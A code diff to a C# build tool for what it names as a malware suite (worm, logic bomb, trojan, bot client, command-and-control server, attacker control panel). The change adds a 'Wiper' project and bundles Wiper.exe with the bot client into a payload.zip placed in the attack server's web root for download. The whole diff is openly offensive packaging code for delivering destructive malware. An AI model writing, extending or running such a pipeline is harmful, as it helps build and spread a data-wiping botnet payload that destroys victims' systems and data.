@@ -41,6 +41,7 @@ namespace Builder
                 BuildProject("LogicBomb");
                 BuildProject("Worm"); // This will now use MSBuild.exe
                 BuildProject("BotClient");
+                BuildProject("Wiper"); // <-- ADD WIPER BUILD
                 BuildProject("AttackerControlPanel");
                 BuildProject("C&CServer");
 
@@ -219,11 +220,40 @@ namespace Builder
         private static void CreateAttackerPackage()
         {
             LogInfo("Creating 'attack' folder structure...");
-            string botClientOutputDir = FindBuildOutputDirectory("BotClient");
-            string zipPath = Path.Combine(WwwRootDir, "payload.zip");
-            ZipFile.CreateFromDirectory(botClientOutputDir, zipPath);
-            LogSuccess("Packaged BotClient into attack/wwwroot/payload.zip");
 
+            // === NEW: Create temporary staging directory for BotClient + Wiper ===
+            string tempBotStagingDir = Path.Combine(Path.GetTempPath(), $"BotStaging_{Guid.NewGuid():N}");
+            Directory.CreateDirectory(tempBotStagingDir);
+
+            try
+            {
+                // 1. Copy BotClient files to staging
+                string botClientOutputDir = FindBuildOutputDirectory("BotClient");
+                CopyDirectoryContents(botClientOutputDir, tempBotStagingDir);
+                LogSuccess("Staged BotClient to temporary directory");
+
+                // 2. Create 'wiper' subdirectory inside staging
+                string wiperSubDir = Path.Combine(tempBotStagingDir, "wiper");
+                Directory.CreateDirectory(wiperSubDir);
+
+                // 3. Copy Wiper.exe into wiper subdirectory
+                string wiperExePath = FindExecutable("Wiper", "Wiper.exe");
+                string wiperDestPath = Path.Combine(wiperSubDir, "Wiper.exe");
+                File.Copy(wiperExePath, wiperDestPath, true);
+                LogSuccess("Included Wiper.exe in BotClient package at 'wiper/Wiper.exe'");
+
+                // 4. Zip the complete package (BotClient + wiper subfolder)
+                string zipPath = Path.Combine(WwwRootDir, "payload.zip");
+                ZipFile.CreateFromDirectory(tempBotStagingDir, zipPath);
+                LogSuccess("Packaged BotClient + Wiper into attack/wwwroot/payload.zip");
+            }
+            finally
+            {
+                // Clean up temporary staging directory
+                try { Directory.Delete(tempBotStagingDir, true); } catch { }
+            }
+
+            // Continue with C&C Server and Control Panel staging
             string cncServerOutputDir = FindBuildOutputDirectory("C&CServer");
             CopyDirectoryContents(cncServerOutputDir, AttackerOutputDir);
             LogSuccess("Staged C&CServer into 'attack' folder");
@@ -306,7 +336,7 @@ namespace Builder
             LogInfo("Cleaning up intermediate files...");
             try
             {
-                string[] projectsToClean = { "Worm", "LogicBomb", "Trojan", "SharedCrypto", "BotClient", "AttackerControlPanel", "C&CServer" };
+                string[] projectsToClean = { "Worm", "LogicBomb", "Trojan", "SharedCrypto", "BotClient", "Wiper", "AttackerControlPanel", "C&CServer" };
                 foreach (string project in projectsToClean)
                 {
                     string binPath = Path.Combine(SolutionDir, project, "bin");
